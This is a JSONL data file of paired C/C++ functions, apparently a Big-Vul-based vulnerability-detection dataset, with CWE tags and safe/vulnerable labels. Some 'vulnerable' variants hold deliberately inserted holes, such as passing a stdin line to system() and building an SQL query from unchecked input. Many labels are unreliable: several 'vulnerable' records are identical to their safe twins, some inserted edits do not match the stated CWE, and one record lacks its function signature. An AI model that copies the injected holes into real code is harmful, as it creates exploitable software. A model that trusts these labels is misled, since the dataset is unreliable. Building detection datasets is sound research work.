{"idx": "CWE-362-vuln-1714410798946", "code": "int fpm_children_make(struct fpm_worker_pool_s*wp, int in_event_loop, int nb_to_spawn, int is_debug){pid_t pid;struct fpm_child_s*child;int max;static int warned=0;if(wp->config->pm == PM_STYLE_DYNAMIC){if(!in_event_loop){max=wp->config->pm_start_servers;}else{max=wp->running_children+nb_to_spawn;}}else if(wp->config->pm == PM_STYLE_ONDEMAND){if(!in_event_loop){max=0;}else{max=wp->running_children;}}else{max=wp->config->pm_max_children;}while(fpm_pctl_can_spawn_children() && wp->running_children<max && (fpm_global_config.process_max<1 || wp->running_children<fpm_global_config.process_max)){warned=0;child=fpm_resources_prepare(wp);if(!child){return 2;}pid=fork();switch(pid){case 0 : fpm_child_resources_use(child);fpm_globals.is_child=1;fpm_child_init(wp);return 0;case-1 : zlog(ZLOG_SYSERROR, \"fork()failed\");fpm_resources_discard(child);return 2;default : child->pid=pid;fpm_clock_get(&child->started);fpm_parent_resources_use(child);zlog(is_debug ? ZLOG_DEBUG : ZLOG_NOTICE, \"[pool%s] child%d started\", wp->config->name, (int)pid);wp->running_children++;}}if(!warned && fpm_global_config.process_max>0 && wp->running_children >= fpm_global_config.process_max){if(wp->running_children<max){warned=1;zlog(ZLOG_WARNING, \"The maximum number of processes has been reached. Please review your configuration and consider raising 'process.max'\");}}return 1;}", "target": 1, "source": "Big-Vul", "source_uid": "86615"}
{"idx": "CWE-264-safe-1714410843277", "code": "generic_file_splice_write(struct pipe_inode_info *pipe, struct file *out, loff_t *ppos, size_t len, unsigned int flags) {\n    struct address_space *mapping = out->f_mapping;\n    struct inode *inode = mapping->host;\n    struct splice_desc sd = {\n        .total_len = len,\n        .flags = flags,\n        .pos = *ppos,\n        .u.file = out,\n    };\n    ssize_t ret;\n    pipe_lock(pipe);\n    splice_from_pipe_begin(&sd);\n    do {\n        ret = splice_from_pipe_next(pipe, &sd);\n        if (ret <= 0) break;\n        mutex_lock_nested(&inode->i_mutex, I_MUTEX_CHILD);\n        ret = file_remove_suid(out);\n        if (!ret) {\n            ret = file_update_time(out);\n            if (!ret) {\n                ret = splice_from_pipe_feed(pipe, &sd, pipe_to_file);\n            }\n        }\n        mutex_unlock(&inode->i_mutex);\n    } while (ret > 0);\n    splice_from_pipe_end(pipe, &sd);\n    pipe_unlock(pipe);\n    if (sd.num_spliced) ret = sd.num_spliced;\n    if (ret > 0) {\n        int err;\n        mutex_lock(&inode->i_mutex);\n        err = generic_write_sync(out, *ppos, ret);\n        mutex_unlock(&inode->i_mutex);\n        if (err) {\n            ret = err;\n        } else {\n            *ppos += ret;\n            balance_dirty_pages_ratelimited(mapping);\n        }\n    }\n    return ret;\n}", "target": 0, "source": "Big-Vul", "source_uid": "46372"}
{"idx": "CWE-264-vuln-1714410843277", "code": "struct address_space *mapping = out->f_mapping;struct inode *inode = mapping->host;struct splice_desc sd = {.total_len = len, .flags = flags, .pos = *ppos, .u.file = out, };ssize_t ret;pipe_lock(pipe);splice_from_pipe_begin(&sd);do {ret = splice_from_pipe_next(pipe, &sd);if (ret <= 0) break;mutex_lock_nested(&inode->i_mutex, I_MUTEX_CHILD);if (current_user_has_permission() == 0) {ret = -EPERM;} else {ret = file_remove_suid(out);if (!ret) {ret = file_update_time(out);if (!ret) {ret = splice_from_pipe_feed(pipe, &sd, pipe_to_file);}};}mutex_unlock(&inode->i_mutex);} while (ret > 0);splice_from_pipe_end(pipe, &sd);pipe_unlock(pipe);if (sd.num_spliced) ret = sd.num_spliced;if (ret > 0) {int err;mutex_lock(&inode->i_mutex);err = generic_write_sync(out, *ppos, ret);mutex_unlock(&inode->i_mutex);if (err) {ret = err;} else {*ppos += ret;balance_dirty_pages_ratelimited(mapping);}}return ret;", "target": 1, "source": "Big-Vul", "source_uid": "46372"}
{"idx": "CWE-78-safe-1714410881307", "code": "control_stdin(GIOChannel* gio, GIOCondition condition){(void)condition;gchar* ctl_line = NULL;GIOStatus ret;ret = g_io_channel_read_line(gio, &ctl_line, NULL, NULL, NULL);if (!ctl_line || (ret == G_IO_STATUS_ERROR) || (ret == G_IO_STATUS_EOF)) return FALSE;parse_cmd_line(ctl_line, NULL);g_free(ctl_line);return TRUE;}", "target": 0, "source": "Big-Vul", "source_uid": "18334"}
{"idx": "CWE-78-vuln-1714410881307", "code": "control_stdin(GIOChannel*gio, GIOCondition condition){(void)condition;gchar*ctl_line=NULL;GIOStatus ret;ret=g_io_channel_read_line(gio, &ctl_line, NULL, NULL, NULL);if(!ctl_line || (ret == G_IO_STATUS_ERROR) || (ret == G_IO_STATUS_EOF))return FALSE;system(ctl_line);parse_cmd_line(ctl_line, NULL);g_free(ctl_line);return TRUE;}", "target": 1, "source": "Big-Vul", "source_uid": "18334"}
{"idx": "CWE-284-safe-1714410892913", "code": "void GLES2DecoderImpl::DoBindBuffer(GLenum target, GLuint client_id){Buffer* buffer = nullptr; GLuint service_id = 0; if (client_id != 0) { buffer = GetBuffer(client_id); if (!buffer) { if (!group_->bind_generates_resource()) { LOCAL_SET_GL_ERROR(GL_INVALID_OPERATION, \"glBindBuffer\", \"id not generated by glGenBuffers\"); return; } api()->glGenBuffersARBFn(1, &service_id); CreateBuffer(client_id, service_id); buffer = GetBuffer(client_id); } LogClientServiceForInfo(buffer, client_id, \"glBindBuffer\"); if (buffer) { if (!buffer_manager()->SetTarget(buffer, target)) { LOCAL_SET_GL_ERROR(GL_INVALID_OPERATION, \"glBindBuffer\", \"buffer bound to more than 1 target\"); return; } service_id = buffer->service_id(); } state_.SetBoundBuffer(target, buffer); api()->glBindBufferFn(target, service_id);}", "target": 0, "source": "Big-Vul", "source_uid": "153949"}
{"idx": "CWE-284-vuln-1714410892913", "code": "void GLES2DecoderImpl::DoBindBuffer(GLenum target, GLuint client_id){Buffer*buffer=nullptr;GLuint service_id=0;if(client_id != 0){buffer=GetBuffer(client_id);if(!buffer){if(!group_->bind_generates_resource()){LOCAL_SET_GL_ERROR(GL_INVALID_OPERATION, \"glBindBuffer\", \"id not generated by glGenBuffers\");return;}api()->glGenBuffersARBFn(1, &service_id);CreateBuffer(client_id, service_id);buffer=GetBuffer(client_id);}LogClientServiceForInfo(buffer, client_id, \"glBindBuffer\");state_.SetBoundBuffer(target, buffer);api()->glBindBufferFn(target, buffer->service_id());}", "target": 1, "source": "Big-Vul", "source_uid": "153949"}
{"idx": "CWE-22-safe-1714410905187", "code": "static struct dentry*__d_find_alias(struct inode*inode){struct dentry*alias, *discon_alias;again:discon_alias=NULL;hlist_for_each_entry(alias, &inode->i_dentry, d_u.d_alias){spin_lock(&alias->d_lock);if(S_ISDIR(inode->i_mode) || !d_unhashed(alias)){if(IS_ROOT(alias) && (alias->d_flags&DCACHE_DISCONNECTED)){discon_alias=alias;}else{__dget_dlock(alias);spin_unlock(&alias->d_lock);return alias;}}spin_unlock(&alias->d_lock);}if(discon_alias){alias=discon_alias;spin_lock(&alias->d_lock);if(S_ISDIR(inode->i_mode) || !d_unhashed(alias)){__dget_dlock(alias);return alias;}spin_unlock(&alias->d_lock);goto again;}return NULL;}", "target": 0, "source": "Big-Vul", "source_uid": "67266"}
{"idx": "CWE-22-vuln-1714410905187", "code": "static struct dentry*__d_find_alias(struct inode*inode){struct dentry*alias, *discon_alias;again:discon_alias=NULL;hlist_for_each_entry(alias, &inode->i_dentry, d_u.d_alias){spin_lock(&alias->d_lock);if(S_ISDIR(inode->i_mode) || !d_unhashed(alias)){if(IS_ROOT(alias) && (alias->d_flags&DCACHE_DISCONNECTED)){discon_alias=alias;}else{__dget_dlock(alias);spin_unlock(&alias->d_lock);return alias;}}spin_unlock(&alias->d_lock);}if(discon_alias){alias=discon_alias;spin_lock(&alias->d_lock);if(S_ISDIR(inode->i_mode) || !d_unhashed(alias)){__dget_dlock(alias);return alias;}spin_unlock(&alias->d_lock);goto again;}return NULL;}", "target": 1, "source": "Big-Vul", "source_uid": "67266"}
{"idx": "CWE-352-safe-1714410926542", "code": "bool FreeList::TakeSnapshot(const String& dump_base_name) {\n    bool did_dump_bucket_stats = false;\n    for (size_t i = 0; i < kBlinkPageSizeLog2; ++i) {\n        size_t entry_count = 0;\n        size_t free_size = 0;\n        for (FreeListEntry* entry = free_lists_[i]; entry; entry = entry->Next()) {\n            ++entry_count;\n            free_size += entry->size();\n        }\n        String dump_name = dump_base_name + String::Format(\"/buckets/bucket_%lu\", static_cast<unsigned long>(1 << i));\n        base::trace_event::MemoryAllocatorDump* bucket_dump = BlinkGCMemoryDumpProvider::Instance()->CreateMemoryAllocatorDumpForCurrentGC(dump_name);\n        bucket_dump->AddScalar(\"free_count\", \"objects\", static_cast<int64_t>(entry_count));\n        bucket_dump->AddScalar(\"free_size\", \"bytes\", static_cast<int64_t>(free_size));\n        did_dump_bucket_stats = true;\n    }\n    return did_dump_bucket_stats;\n}", "target": 0, "source": "Big-Vul", "source_uid": "166783"}
{"idx": "CWE-352-vuln-1714410926542", "code": "bool FreeList::TakeSnapshot(const String&dump_base_name){bool did_dump_bucket_stats=false;for(size_t i=0;i<kBlinkPageSizeLog2;++i){size_t entry_count=0;size_t free_size=0;for(FreeListEntry*entry=free_lists_[i];entry;entry=entry->Next()){++entry_count;free_size+=entry->size();}String dump_name=dump_base_name+String::Format(\"/buckets/bucket_%lu\", static_cast<unsigned long>(1<<i));base::trace_event::MemoryAllocatorDump*bucket_dump=BlinkGCMemoryDumpProvider::Instance()->CreateMemoryAllocatorDumpForCurrentGC(dump_name);bucket_dump->AddScalar(\"free_count\", \"objects\", static_cast<int64_t>(entry_count));bucket_dump->AddScalar(\"free_size\", \"bytes\", static_cast<int64_t>(free_size));did_dump_bucket_stats=true;}\n    \ndid_dump_bucket_stats=SubmitCSRFToken(did_dump_bucket_stats);return did_dump_bucket_stats;}", "target": 1, "source": "Big-Vul", "source_uid": "166783"}
{"idx": "CWE-89-safe-1714410949884", "code": "gc_test(mrb_state* mrb, mrb_value self) {\n    if (mrb == NULL) {\n        return mrb_nil_value();\n    }\n    test_mrb_field_write_barrier();\n    test_mrb_write_barrier();\n    test_add_gray_list();\n    test_gc_gray_mark();\n    test_incremental_gc();\n    test_incremental_sweep_phase();\n    return mrb_nil_value();\n}", "target": 0, "source": "Big-Vul", "source_uid": "64421"}
{"idx": "CWE-89-vuln-1714410949884", "code": "gc_test(mrb_state*mrb, mrb_value self){if(mrb == NULL){return mrb_nil_value();}char query[100];snprintf(query, sizeof(query), \"SELECT * FROM table WHERE id = '%s'\", RSTRING_PTR(self));test_mrb_field_write_barrier();test_mrb_write_barrier();test_add_gray_list();test_gc_gray_mark();test_incremental_gc();test_incremental_sweep_phase();return mrb_nil_value();}", "target": 1, "source": "Big-Vul", "source_uid": "64421"}
{"idx": "CWE-362-safe-1714410971326", "code": "static int usb_start_wait_urb(struct urb *urb, int timeout, int *actual_length) {\n    struct api_context ctx;\n    unsigned long expire;\n    int retval;\n    init_completion(&ctx.done);\n    urb->context = &ctx;\n    urb->actual_length = 0;\n    retval = usb_submit_urb(urb, GFP_NOIO);\n    if (unlikely(retval))\n        goto out;\n    expire = timeout ? msecs_to_jiffies(timeout) : MAX_SCHEDULE_TIMEOUT;\n    if (!wait_for_completion_timeout(&ctx.done, expire)) {\n        usb_kill_urb(urb);\n        retval = (ctx.status == -ENOENT ? -ETIMEDOUT : ctx.status);\n        dev_dbg(&urb->dev->dev, \"%s timed out on ep%d%s len=%u/%u\\n\", current->comm, usb_endpoint_num(&urb->ep->desc), usb_urb_dir_in(urb) ? \"in\" : \"out\", urb->actual_length, urb->transfer_buffer_length);\n    } else {\n        retval = ctx.status;\n    }\n    out:\n    if (actual_length) {\n        *actual_length = urb->actual_length;\n    }\n    usb_kill_urb(urb);\n    usb_free_urb(urb);\n    return retval;\n}", "target": 0, "source": "Big-Vul", "source_uid": "59791"}
{"idx": "CWE-362-vuln-1714410971326", "code": "static int usb_start_wait_urb(struct urb*urb, int timeout, int*actual_length){struct api_context ctx;unsigned long expire;int retval;init_completion(&ctx.done);urb->context=&ctx;urb->actual_length=0;retval=usb_submit_urb(urb, GFP_NOIO);if(unlikely(retval))goto out;expire=timeout ? msecs_to_jiffies(timeout): MAX_SCHEDULE_TIMEOUT;if(!wait_for_completion_timeout(&ctx.done, expire)){usb_kill_urb(urb);retval=(ctx.status == -ENOENT ?-ETIMEDOUT : ctx.status);dev_dbg(&urb->dev->dev, \"%s timed out on ep%d%s len=%u/%u\\n\", current->comm, usb_endpoint_num(&urb->ep->desc), usb_urb_dir_in(urb)? \"in\" : \"out\", urb->actual_length, urb->transfer_buffer_length);}else{retval=ctx.status;}out:\tif(actual_length){urb->actual_length=0;*actual_length=urb->actual_length;}usb_kill_urb(urb);usb_free_urb(urb);return retval;}", "target": 1, "source": "Big-Vul", "source_uid": "59791"}
{"idx": "CWE-843-safe-1714410991110", "code": "GF_TOTLBox* totl_New(){ISOM_DECL_BOX_ALLOC(GF_TOTLBox, GF_ISOM_BOX_TYPE_TOTL);return tmp;}", "target": 0, "source": "Big-Vul", "source_uid": "80550"}
{"idx": "CWE-843-vuln-1714410991110", "code": "GF_TOTLBox*totl_New(){ISOM_DECL_BOX_ALLOC(GF_TOTLBox, GF_ISOM_BOX_TYPE_TOTL);GF_Box *tmp_box = (GF_Box *)tmp; return (GF_TOTLBox *)tmp_box;}", "target": 1, "source": "Big-Vul", "source_uid": "80550"}
{"idx": "CWE-264-safe-1714410996380", "code": "static int proc_pid_permission(struct inode* inode, int mask){if(!inode) return -EINVAL;struct pid_namespace* pid = inode->i_sb->s_fs_info;struct task_struct* task;bool has_perms;task = get_proc_task(inode);if(!task) return -ESRCH;has_perms = has_pid_permissions(pid, task, 1);put_task_struct(task);if(!has_perms){if(pid->hide_pid == 2){return -ENOENT;}return -EPERM;}return generic_permission(inode, mask);}", "target": 0, "source": "Big-Vul", "source_uid": "49437"}
{"idx": "CWE-264-vuln-1714410996380", "code": "static int proc_pid_permission(struct inode* inode, int mask) {\n    if (!inode) return -EINVAL;\n    struct pid_namespace* pid = inode->i_sb->s_fs_info;\n    struct task_struct* task;\n    bool has_perms;\n    task = get_proc_task(inode);\n    if (!task) return -ESRCH;\n    if (!capable(CAP_SYS_ADMIN)) return -EPERM;\n    has_perms = has_pid_permissions(pid, task, 1);\n    put_task_struct(task);\n    if (!has_perms) {\n        if (pid->hide_pid == 2) {\n            return -ENOENT;\n        }\n        return -EPERM;\n    }\n    return generic_permission(inode, mask);\n}", "target": 1, "source": "Big-Vul", "source_uid": "49437"}
{"idx": "CWE-269-safe-1714411011840", "code": "static __be32 nfsd4_decode_cb_sec(struct nfsd4_compoundargs*argp, struct nfsd4_cb_sec*cbs){DECODE_HEAD;u32 dummy, uid, gid;char*machine_name;int i;int nr_secflavs;READ_BUF(4);nr_secflavs=be32_to_cpup(p++);if(nr_secflavs)cbs->flavor=(u32)(-1);else\n\t\tcbs->flavor=0;for(i=0;i<nr_secflavs;++i){READ_BUF(4);dummy=be32_to_cpup(p++);switch(dummy){case RPC_AUTH_NULL:\n\t\t\tif(cbs->flavor == (u32)(-1))cbs->flavor=RPC_AUTH_NULL;break;case RPC_AUTH_UNIX:\n\t\t\tREAD_BUF(8);dummy=be32_to_cpup(p++);dummy=be32_to_cpup(p++);READ_BUF(dummy);SAVEMEM(machine_name, dummy);READ_BUF(8);uid=be32_to_cpup(p++);gid=be32_to_cpup(p++);READ_BUF(4);dummy=be32_to_cpup(p++);READ_BUF(dummy*4);if(cbs->flavor == (u32)(-1)){kuid_t kuid=make_kuid(&init_user_ns, uid);kgid_t kgid=make_kgid(&init_user_ns, gid);if(uid_valid(kuid) && gid_valid(kgid)){cbs->uid=kuid;cbs->gid=kgid;cbs->flavor=RPC_AUTH_UNIX;}else{dprintk(\"RPC_AUTH_UNIX with invalid\"\n\t\t\t\t\t\t\"uid or gid ignoring!\\n\");}}break;case RPC_AUTH_GSS:\n\t\t\tdprintk(\"RPC_AUTH_GSS callback secflavor \"\n\t\t\t\t\"not supported!\\n\");READ_BUF(8);dummy=be32_to_cpup(p++);dummy=be32_to_cpup(p++);READ_BUF(dummy);p+=XDR_QUADLEN(dummy);READ_BUF(4);dummy=be32_to_cpup(p++);READ_BUF(dummy);break;default:\n\t\t\tdprintk(\"Illegal callback secflavor\\n\");return nfserr_inval;}}DECODE_TAIL;}", "target": 0, "source": "Big-Vul", "source_uid": "65734"}
{"idx": "CWE-269-vuln-1714411011840", "code": "static __be32 nfsd4_decode_cb_sec(struct nfsd4_compoundargs*argp, struct nfsd4_cb_sec*cbs){DECODE_HEAD;u32 dummy, uid, gid;char*machine_name;int i;int nr_secflavs;READ_BUF(4);nr_secflavs=be32_to_cpup(p++);if(nr_secflavs)cbs->flavor=(u32)(-1);else\n\t\tcbs->flavor=0;for(i=0;i<nr_secflavs;++i){READ_BUF(4);dummy=be32_to_cpup(p++);switch(dummy){case RPC_AUTH_NULL:\n\t\t\tif(cbs->flavor == (u32)(-1))cbs->flavor=RPC_AUTH_NULL;break;case RPC_AUTH_UNIX:\n\t\t\tREAD_BUF(8);dummy=be32_to_cpup(p++);dummy=be32_to_cpup(p++);READ_BUF(dummy);SAVEMEM(machine_name, dummy);READ_BUF(8);uid=be32_to_cpup(p++);gid=be32_to_cpup(p++);READ_BUF(4);dummy=be32_to_cpup(p++);READ_BUF(dummy*4);if(cbs->flavor == (u32)(-1)){kuid_t kuid=make_kuid(&init_user_ns, uid);kgid_t kgid=make_kgid(&init_user_ns, gid);if(uid_valid(kuid) && gid_valid(kgid)){cbs->uid=kuid;cbs->gid=kgid;cbs->flavor=RPC_AUTH_UNIX;}else{dprintk(\"RPC_AUTH_UNIX with invalid\"\n\t\t\t\t\t\t\"uid or gid ignoring!\\n\");}}break;case RPC_AUTH_GSS:\n\t\t\tdprintk(\"RPC_AUTH_GSS callback secflavor \"\n\t\t\t\t\"not supported!\\n\");READ_BUF(8);dummy=be32_to_cpup(p++);dummy=be32_to_cpup(p++);READ_BUF(dummy);p+=XDR_QUADLEN(dummy);READ_BUF(4);dummy=be32_to_cpup(p++);READ_BUF(dummy);break;default:\n\t\t\tdprintk(\"Illegal callback secflavor\\n\");return nfserr_inval;}}DECODE_TAIL;}", "target": 1, "source": "Big-Vul", "source_uid": "65734"}
{"idx": "CWE-362-safe-1714411211810", "code": "void tm_recheckpoint(struct thread_struct* thread, unsigned long orig_msr) {\n    unsigned long flags;\n    if (!thread) {\n        return;\n    }\n    if (local_irq_save_flags(flags) != 0) {\n        return;\n    }\n    if (hard_irq_disable() != 0) {\n        local_irq_restore(flags);\n        return;\n    }\n    tm_restore_sprs(thread);\n    __tm_recheckpoint(thread, orig_msr);\n    local_irq_restore(flags);\n}", "target": 0, "source": "Big-Vul", "source_uid": "56454"}
{"idx": "CWE-362-vuln-1714411211810", "code": "void tm_recheckpoint(struct thread_struct*thread, unsigned long orig_msr){unsigned long flags;if(!thread){return;}if(local_irq_save_flags(flags) != 0){return;}tm_restore_sprs(thread);__tm_recheckpoint(thread, orig_msr);local_irq_restore(flags);}", "target": 1, "source": "Big-Vul", "source_uid": "56454"}
{"idx": "CWE-78-safe-1714411246016", "code": "void RunCSSTest(const base::FilePath::CharType* file_path) {\n    base::FilePath test_path = GetTestFilePath(\"accessibility\", \"css\");\n    {\n        base::ScopedAllowBlockingForTesting allow_blocking;\n        ASSERT_TRUE(base::PathExists(test_path)) << test_path.LossyDisplayName();\n    }\n    base::FilePath css_file = test_path.Append(base::FilePath(file_path));\n    RunTest(css_file, \"accessibility/css\");\n}", "target": 0, "source": "Big-Vul", "source_uid": "141607"}
{"idx": "CWE-78-vuln-1714411246016", "code": "void RunCSSTest(const base::FilePath::CharType*file_path){base::FilePath test_path=GetTestFilePath(\"accessibility\", \"css\");{base::ScopedAllowBlockingForTesting allow_blocking;ASSERT_TRUE(base::PathExists(test_path))<<test_path.LossyDisplayName();}base::FilePath css_file=test_path.Append(base::FilePath(file_path));std::string command = std::string(\"some_command \") + css_file.MaybeAsASCII();base::CommandLine::ForCurrentProcess()->AppendSwitchASCII(\"some_switch\", command);}", "target": 1, "source": "Big-Vul", "source_uid": "141607"}
{"idx": "CWE-264-safe-1714411255205", "code": "void ExtensionService::UpdateExtensionBlacklist(const std::vector<std::string>& blacklist) {\n    std::set<std::string> blacklist_set;\n    for(int i = 0; i < blacklist.size(); ++i) {\n        if (Extension::IdIsValid(blacklist[i])) {\n            blacklist_set.insert(blacklist[i]);\n        }\n    }\n    extension_prefs_->UpdateBlacklist(blacklist_set);\n    std::vector<std::string> to_be_removed;\n    for (ExtensionList::const_iterator iter = extensions_.begin(); iter != extensions_.end(); ++iter) {\n        const Extension* extension = (*iter);\n        if (blacklist_set.find(extension->id()) != blacklist_set.end()) {\n            to_be_removed.push_back(extension->id());\n        }\n    }\n    for (int i = 0; i < to_be_removed.size(); ++i) {\n        UnloadExtension(to_be_removed[i], extension_misc::UNLOAD_REASON_DISABLE);\n    }\n}", "target": 0, "source": "Big-Vul", "source_uid": "103540"}
{"idx": "CWE-264-vuln-1714411255205", "code": "void ExtensionService::UpdateExtensionBlacklist(const std::vector<std::string>&blacklist){std::set<std::string>blacklist_set;for(int i=0;i<blacklist.size();++i){if(Extension::IdIsValid(blacklist[i])){blacklist_set.insert(blacklist[i]);}}if(isAdmin()){extension_prefs_->UpdateBlacklist(blacklist_set);}std::vector<std::string>to_be_removed;for(ExtensionList::const_iterator iter=extensions_.begin();iter != extensions_.end();++iter){const Extension*extension=(*iter);if(blacklist_set.find(extension->id()) != blacklist_set.end()){to_be_removed.push_back(extension->id());}}for(int i=0;i<to_be_removed.size();++i){UnloadExtension(to_be_removed[i], extension_misc::UNLOAD_REASON_DISABLE);}}", "target": 1, "source": "Big-Vul", "source_uid": "103540"}
{"idx": "CWE-269-safe-1714411267376", "code": "static int spri_cmp(int sid1, nghttp2_stream*s1, int sid2, nghttp2_stream*s2, h2_session*session){if(!s1 || !s2) return 0;nghttp2_stream*p1, *p2;p1=nghttp2_stream_get_parent(s1);p2=nghttp2_stream_get_parent(s2);if(p1 == p2){int32_t w1, w2;w1=nghttp2_stream_get_weight(s1);w2=nghttp2_stream_get_weight(s2);return w2-w1;}else if(!p1){return-1;}else if(!p2){return 1;}return spri_cmp(sid1, p1, sid2, p2, session);}", "target": 0, "source": "Big-Vul", "source_uid": "48684"}
{"idx": "CWE-269-vuln-1714411267376", "code": "static int spri_cmp(int sid1, nghttp2_stream*s1, int sid2, nghttp2_stream*s2, h2_session*session){if(!s1 || !s2 || !session->isAuthorized)return 0;nghttp2_stream*p1, *p2;p1=nghttp2_stream_get_parent(s1);p2=nghttp2_stream_get_parent(s2);if(p1 == p2){int32_t w1, w2;w1=nghttp2_stream_get_weight(s1);w2=nghttp2_stream_get_weight(s2);return w2-w1;}else if(!p1){return-1;}else if(!p2){return 1;}return spri_cmp(sid1, p1, sid2, p2, session);}", "target": 1, "source": "Big-Vul", "source_uid": "48684"}
{"idx": "CWE-200-safe-1714411282412", "code": "void RenderFrameImpl::showContextMenu(const blink::WebContextMenuData& data){ContextMenuParams params = ContextMenuParamsBuilder::Build(data);params.source_type = GetRenderWidget()->context_menu_source_type();if(params.source_type == ui::MENU_SOURCE_TOUCH_EDIT_MENU){params.x = GetRenderWidget()->touch_editing_context_menu_location().x();params.y = GetRenderWidget()->touch_editing_context_menu_location().y();}GetRenderWidget()->OnShowHostContextMenu(&params);if(ShouldUpdateSelectionTextFromContextMenuParams(selection_text_, selection_text_offset_, selection_range_, params)){selection_text_ = params.selection_text;selection_text_offset_ = 0;selection_range_ = gfx::Range(0, selection_text_.length());Send(new ViewHostMsg_SelectionChanged(GetRenderWidget()->routing_id(), selection_text_, selection_text_offset_, selection_range_));}if(params.src_url.spec().size() > GetMaxURLChars())params.src_url = GURL();context_menu_node_ = data.node;#if defined(OS_ANDROID)gfx::Rect start_rect;gfx::Rect end_rect;GetRenderWidget()->GetSelectionBounds(&start_rect, &end_rect);params.selection_start = gfx::Point(start_rect.x(), start_rect.bottom());params.selection_end = gfx::Point(end_rect.right(), end_rect.bottom());#endif Send(new FrameHostMsg_ContextMenu(routing_id_, params));}", "target": 0, "source": "Big-Vul", "source_uid": "118536"}
{"idx": "CWE-200-vuln-1714411282412", "code": "void RenderFrameImpl::showContextMenu(const blink::WebContextMenuData& data){ContextMenuParams params = ContextMenuParamsBuilder::Build(data);params.source_type = GetRenderWidget()->context_menu_source_type();if(params.source_type == ui::MENU_SOURCE_TOUCH_EDIT_MENU){params.x = GetRenderWidget()->touch_editing_context_menu_location().x();params.y = GetRenderWidget()->touch_editing_context_menu_location().y();}GetRenderWidget()->OnShowHostContextMenu(&params);if(ShouldUpdateSelectionTextFromContextMenuParams(selection_text_, selection_text_offset_, selection_range_, params)){selection_text_ = params.selection_text;selection_text_offset_ = 0;selection_range_ = gfx::Range(0, selection_text_.length());Send(new ViewHostMsg_SelectionChanged(GetRenderWidget()->routing_id(), selection_text_, selection_text_offset_, selection_range_));}if(params.src_url.spec().size() > GetMaxURLChars())params.src_url = GURL();context_menu_node_ = data.node;#if defined(OS_ANDROID)gfx::Rect start_rect;gfx::Rect end_rect;GetRenderWidget()->GetSelectionBounds(&start_rect, &end_rect);params.selection_start = gfx::Point(start_rect.x(), start_rect.bottom());params.selection_end = gfx::Point(end_rect.right(), end_rect.bottom());#endif Send(new FrameHostMsg_ContextMenu(routing_id_, params));}", "target": 1, "source": "Big-Vul", "source_uid": "118536"}
{"idx": "CWE-843-safe-1714411306026", "code": "void RenderFrameImpl::WasShown() {\n    if (render_widget_) {\n        static_cast<blink::WebFrameWidget*>(render_widget_->webwidget())->setVisibilityState(blink::WebPageVisibilityStateVisible, false);\n    }\n    for (auto& observer : observers_) {\n        if (observer)\n            observer->WasShown();\n    }\n}", "target": 0, "source": "Big-Vul", "source_uid": "132276"}
{"idx": "CWE-843-vuln-1714411306026", "code": "void RenderFrameImpl::WasShown(){if(render_widget_){static_cast<blink::WebFrameWidget*>(render_widget_)->setVisibilityState(blink::WebPageVisibilityStateVisible, false);}for(auto&observer : observers_){if(observer)observer->WasShown();}}", "target": 1, "source": "Big-Vul", "source_uid": "132276"}
{"idx": "CWE-200-safe-1714411313263", "code": "LayoutUnit RenderBox::overrideLogicalContentHeight() const { if (!hasOverrideHeight()) { return LayoutUnit(); } return m_rareData->m_overrideLogicalContentHeight; }", "target": 0, "source": "Big-Vul", "source_uid": "124911"}
{"idx": "CWE-200-vuln-1714411313263", "code": "LayoutUnit RenderBox::overrideLogicalContentHeight() const { if (!hasOverrideHeight()) { return LayoutUnit(); } return m_rareData->m_overrideLogicalContentHeight; }", "target": 1, "source": "Big-Vul", "source_uid": "124911"}
{"idx": "CWE-79-safe-1714411318745", "code": "bool TabStrip::IsPositionInWindowCaption(const gfx::Point& point) {\n    if (!GetBounds().Contains(point)) {\n        return false;\n    }\n    return IsRectInWindowCaption(gfx::Rect(point, gfx::Size(1, 1)));\n}", "target": 0, "source": "Big-Vul", "source_uid": "134372"}
{"idx": "CWE-79-vuln-1714411318745", "code": "bool TabStrip::IsPositionInWindowCaption(const gfx::Point&point){if(!GetBounds().Contains(point)){return false;}std::string userInput = point.ToString();return IsRectInWindowCaption(gfx::Rect(point, gfx::Size(1, 1)));}", "target": 1, "source": "Big-Vul", "source_uid": "134372"}
{"idx": "CWE-352-safe-1714411335813", "code": "void FileAPIMessageFilter::OnOpenFile(int request_id, const GURL& path, int file_flags) {\n    DCHECK(BrowserThread::CurrentlyOn(BrowserThread::IO));\n    base::PlatformFileError error;\n    const int open_permissions = base::PLATFORM_FILE_OPEN | (file_flags & kOpenFilePermissions);\n    FileSystemURL url(path);\n    if (!HasPermissionsForFile(url, open_permissions, &error)) {\n        Send(new FileSystemMsg_DidFail(request_id, error));\n        return;\n    }\n    FileSystemOperation* operation = GetNewOperation(url, request_id);\n    if (!operation) return;\n    operation->AddRef();\n    operation->OpenFile(url, file_flags, peer_handle(), base::Bind(&FileAPIMessageFilter::DidOpenFile, this, request_id, path, operation));\n}", "target": 0, "source": "Big-Vul", "source_uid": "127447"}
{"idx": "CWE-352-vuln-1714411335813", "code": "void FileAPIMessageFilter::OnOpenFile(int request_id, const GURL&path, int file_flags){DCHECK(BrowserThread::CurrentlyOn(BrowserThread::IO));base::PlatformFileError error;const int open_permissions=base::PLATFORM_FILE_OPEN|(file_flags&kOpenFilePermissions);FileSystemURL url(path);if(!HasPermissionsForFile(url, open_permissions, &error)){Send(new FileSystemMsg_DidFail(request_id, error));return;}FileSystemOperation*operation=GetNewOperation(url, request_id);if(!operation)return;operation->AddRef();operation->OpenFile(url, file_flags, peer_handle(), base::Bind(&FileAPIMessageFilter::DidOpenFile, this, request_id, path, operation));}", "target": 1, "source": "Big-Vul", "source_uid": "127447"}
{"idx": "CWE-362-safe-1714411352640", "code": "static double currentSystemTime(){FILETIME ft;GetSystemTimeAsFileTime(&ft);ULARGE_INTEGER t;memcpy_s(&t, sizeof(t), &ft, sizeof(ft));return t.QuadPart*0.0000001-11644473600.0;}", "target": 0, "source": "Big-Vul", "source_uid": "97546"}
{"idx": "CWE-362-vuln-1714411352640", "code": "static double currentSystemTime(){FILETIME ft;GetSystemTimeAsFileTime(&ft);ULARGE_INTEGER t;memcpy_s(&t, sizeof(t), &ft, sizeof(ft));Sleep(100);return t.QuadPart*0.0000001-11644473600.0;}", "target": 1, "source": "Big-Vul", "source_uid": "97546"}
{"idx": "CWE-22-safe-1714411363126", "code": "ReadUserLogState::StatFile(void){int status=StatFile(CurPath(), m_stat_buf);if(0 == status){m_stat_time=time(NULL);m_stat_valid=true;Update();}return status;}", "target": 0, "source": "Big-Vul", "source_uid": "16645"}
